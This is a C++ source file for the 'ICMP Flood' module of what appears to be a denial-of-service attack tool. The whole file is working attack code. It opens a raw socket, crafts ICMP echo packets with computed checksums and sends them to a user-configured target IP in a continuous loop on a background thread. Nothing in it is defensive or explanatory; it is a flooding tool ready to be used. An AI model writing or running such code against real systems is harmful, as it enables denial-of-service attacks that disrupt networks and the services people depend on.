#include <iostream>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

#include "../headers/icmp.h"

ICMP::ICMP(Mode mode) : packet_count(-1), current_mode(mode), stop_flag(false) {}

ICMP::~ICMP() {
    stop();
}

std::string ICMP::get_name() {
    return "ICMP Flood";
}

void ICMP::stop() {
    stop_flag = true;
    if (attack_thread.joinable()) {
        attack_thread.join();
    }
    //std::cout << get_name() << " stopped." << std::endl;
}

void ICMP::run(Session* session) {
    if (session->target_ip.empty()) {
        std::cerr << C_YELLOW << "Target IP is not set. Please configure it in the main menu." << C_RESET << std::endl;
        return;
    }
    stop_flag = false;
    attack_thread = std::thread(&ICMP::flood_loop, this, session->target_ip);
    //std::cout << C_BOLD << get_name() << " started..." << C_RESET << std::endl;
}

void ICMP::flood_loop(std::string target_ip_str) {
    const char* target_ip = target_ip_str.c_str();

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("ICMP flood_loop socket creation failed");
        return;
    }

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    if (inet_pton(AF_INET, target_ip, &dest.sin_addr) <= 0) {
        perror("Invalid IP address");
        close(sock);
        return;
    }

    char packet[sizeof(struct icmphdr) + 64];
    memset(packet, 0, sizeof(packet));

    struct icmphdr* icmp = (struct icmphdr*)packet;
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = htons(rand() % 65535);
    memset(packet + sizeof(struct icmphdr), 'A', 64);

    long current_packet_count = 0;

    while (!stop_flag) {
        icmp->un.echo.sequence = htons(current_packet_count);
        icmp->checksum = 0;
        icmp->checksum = checksum(packet, sizeof(packet));

        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
            perror("ICMP send failed");
        }

        current_packet_count++;
        if (packet_count > 0 && current_packet_count >= packet_count) {
            break; 
        }
    }

    close(sock);
}

unsigned short ICMP::checksum(void* b, int len) {
    unsigned short* buf = (unsigned short*)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char*)buf;
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}
